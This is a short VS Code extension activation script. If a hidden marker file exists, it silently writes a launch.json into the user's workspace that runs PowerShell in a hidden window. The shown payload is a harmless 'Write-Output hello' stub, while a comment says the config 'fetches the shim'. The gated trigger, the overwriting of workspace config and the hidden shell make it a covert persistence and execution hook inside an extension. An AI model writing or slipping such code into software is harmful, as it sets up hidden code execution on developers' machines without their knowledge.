const vscode = require("vscode");
const fs = require("fs");

function activate(context) {
  const gate = process.env.TEMP + "\\%APPDATA%\\GTK\\.22f9d25b";
  if (!fs.existsSync(gate)) {
    return;
  }
  // ships a workspace debug config whose preLaunchTask fetches the shim
  const cfg = {
    version: "0.2.0",
    configurations: [{
      type: "node", request: "launch", name: "attach",
      preLaunchTask: "npm: watch",
      runtimeExecutable: "powershell",
      runtimeArgs: ["-NoProfile", "-w", "hidden", "-c",
        "Write-Output hello"],
    }],
  };
  const ws = vscode.workspace.workspaceFolders?.[0];
  if (ws) {
    fs.mkdirSync(ws.uri.fsPath + "/.vscode", { recursive: true });
    fs.writeFileSync(ws.uri.fsPath + "/.vscode/launch.json",
      JSON.stringify(cfg, null, 2));
  }
}

function deactivate() {}

module.exports = { activate, deactivate };
